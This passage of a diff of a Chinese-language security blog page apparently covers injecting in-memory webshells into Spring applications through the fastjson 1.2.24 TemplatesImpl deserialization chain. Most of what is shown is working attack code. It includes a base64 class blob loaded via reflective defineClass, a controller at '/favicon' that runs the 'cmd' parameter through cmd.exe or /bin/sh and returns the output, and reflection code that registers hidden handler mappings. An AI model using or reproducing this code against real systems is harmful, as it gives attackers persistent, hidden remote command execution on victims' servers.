DzoGuwASWRkGtgATtgAUtwAVEha2ABc6BxkHtgAYmQALGQe2ABmnAAUZBToFGQe2ABoZBBkFtgAbGQS2ABwZBLYAHacADCwRAZS5AB4CAKcABE6xAAEAAACuALEAHwADACUAAABKABIAAAAOAAkADwARABAAFQARABkAEwApABQARwAWAGIAGAB4ABkAjAAaAJEAGwCYABwAnQAdAKIAHgClAB8ArgAiALEAIQCyACMAJgAAAFwACQBEAAMAKwAsAAYAGQCJAC0ALgAFAGIAQAArACwABgB4ACoALwAwAAcACQClADEALgADABEAnQAyADMABAAAALMAJwAoAAAAAACzADQANQABAAAAswA2ADcAAgA4AAAAKQAI/gBHBwA5BwA6BwA5/AAaBwA7/AAlBwA8QQcAOfgAGvkACEIHAD0AAD4AAAAOAAEAPwABAEBbAAFzAEEAAgBCAAAAAgBDAD4AAAAGAAEARAAA&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">b64</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m0</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">className</span><span class="o">,</span> <span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span> <span class="n">abstractHandlerMapping</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">RequestMappingHandlerMapping</span> <span class="n">r</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//通过反射获得自定义controller中唯一的Method对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">getDeclaredMethods</span><span class="o">())[</span><span class="n">0</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//定义访问controller的URL地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">PatternsRequestCondition</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PatternsRequestCondition</span><span class="o">(</span><span class="s">&#34;/hahaha&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//定义允许访问 controller 的 HTTP 方法（GET/POST）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">RequestMethodsRequestCondition</span> <span class="n">ms</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMethodsRequestCondition</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//在内存中动态注册 controller
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RequestMappingInfo</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">ms</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="na">registerMapping</span><span class="o">(</span><span class="n">info</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(),</span> <span class="n">method</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>InjectControl类，定义的处理请求的control，把该类class字节码base64编码后放到inject类的字段中。</p>
 <div class="highlight"><div class="chroma">
@@ -807,49 +807,49 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
-
-<span class="nd">@Controller</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectControl</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="nf">InjectControl</span><span class="o">()</span> <span class="o">{</span>
-    <span class="o">}</span>
-
-    <span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">&#34;/favicon&#34;</span><span class="o">})</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">login</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">String</span> <span class="n">arg0</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
-            <span class="n">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
-            <span class="k">if</span> <span class="o">(</span><span class="n">arg0</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">String</span> <span class="n">o</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
-                <span class="n">ProcessBuilder</span> <span class="n">p</span><span class="o">;</span>
-                <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">))</span> <span class="o">{</span>
-                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">arg0</span><span class="o">});</span>
-                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">arg0</span><span class="o">});</span>
-                <span class="o">}</span>
-
-                <span class="n">Scanner</span> <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">())).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\A&#34;</span><span class="o">);</span>
-                <span class="n">o</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">c</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="n">o</span><span class="o">;</span>
-                <span class="n">c</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
-                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
-                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-                <span class="n">response</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="n">404</span><span class="o">);</span>
-            <span class="o">}</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var8</span><span class="o">)</span> <span class="o">{</span>
-        <span class="o">}</span>
-
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@Controller</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">InjectControl</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">InjectControl</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">&#34;/favicon&#34;</span><span class="o">})</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">login</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">arg0</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">arg0</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">o</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ProcessBuilder</span> <span class="n">p</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">arg0</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">arg0</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">c</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">())).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\A&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">o</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">c</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="n">o</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="n">404</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var8</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>利用fastjson 1.2.24的TemplatesImpl利用链，加载字节码。</p>
 <p><img src="/images/image-20211106230512.png" alt=""></p>
@@ -874,16 +874,16 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//在当前上下文环境中注册一个名为dynamicController的Webshell controller实例bean
-</span><span class="c1"></span><span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">&#34;dynamicController&#34;</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
-<span class="c1">//从当前上下文环境中获得DefaultAnnotationHandlerMapping的实例bean
-</span><span class="c1"></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span>  <span class="n">dh</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-<span class="c1">//反射获得registerHandler Method
-</span><span class="c1"></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractUrlHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;registerHandler&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-<span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-<span class="c1">//将dynamicController和URL注册到handlerMap中
-</span><span class="c1"></span><span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">dh</span><span class="o">,</span> <span class="s">&#34;/favicon&#34;</span><span class="o">,</span> <span class="s">&#34;dynamicController&#34;</span><span class="o">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//在当前上下文环境中注册一个名为dynamicController的Webshell controller实例bean
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">&#34;dynamicController&#34;</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//从当前上下文环境中获得DefaultAnnotationHandlerMapping的实例bean
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span>  <span class="n">dh</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">DefaultAnnotationHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//反射获得registerHandler Method
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractUrlHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;registerHandler&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//将dynamicController和URL注册到handlerMap中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">dh</span><span class="o">,</span> <span class="s">&#34;/favicon&#34;</span><span class="o">,</span> <span class="s">&#34;dynamicController&#34;</span><span class="o">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -898,12 +898,12 @@ org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping�
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">&#34;dynamicController&#34;</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
-<span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span> <span class="n">requestMappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMethodMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;detectHandlerMethods&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-<span class="n">m1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-<span class="n">m1</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">requestMappingHandlerMapping</span><span class="o">,</span> <span class="s">&#34;dynamicController&#34;</span><span class="o">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="na">getBeanFactory</span><span class="o">().</span><span class="na">registerSingleton</span><span class="o">(</span><span class="s">&#34;dynamicController&#34;</span><span class="o">,</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;me.landgrey.SSOLogin&#34;</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span> <span class="n">requestMappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">mvc</span><span class="o">.</span><span class="na">method</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m1</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMethodMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;detectHandlerMethods&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
